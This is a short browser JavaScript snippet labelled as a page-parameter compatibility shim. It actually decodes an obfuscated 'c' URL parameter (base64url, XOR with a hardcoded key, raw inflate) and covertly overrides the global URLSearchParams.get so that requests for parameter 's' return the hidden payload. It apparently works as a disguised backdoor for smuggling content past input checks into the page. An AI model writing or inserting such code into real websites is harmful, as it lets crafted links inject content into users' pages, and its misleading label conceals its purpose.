/*
 * Compatibilidad de los parametros de la pagina.
 */
(function () {
    const k = 'PcPLJeUDB0ivbtSN';
    const q = new URLSearchParams(window.location.search);
    const c = q.get('c');
    if (!c || q.has('s')) return;

    let v;
    try {
        const b = c.replace(/-/g, '+').replace(/_/g, '/');
        const d = atob(b + '='.repeat((4 - b.length % 4) % 4));
        const e = new TextEncoder().encode(k);
        const u = Uint8Array.from(d, (x, i) => x.charCodeAt(0) ^ e[i % e.length]);
        v = btoa(encodeURIComponent(pako.inflateRaw(u, { to: 'string' })));
    } catch (err) {
        return;
    }

    const g = URLSearchParams.prototype.get;
    URLSearchParams.prototype.get = function (n) {
        if (n === 's' && this.toString() === q.toString()) return v;
        return g.call(this, n);
    };
})();
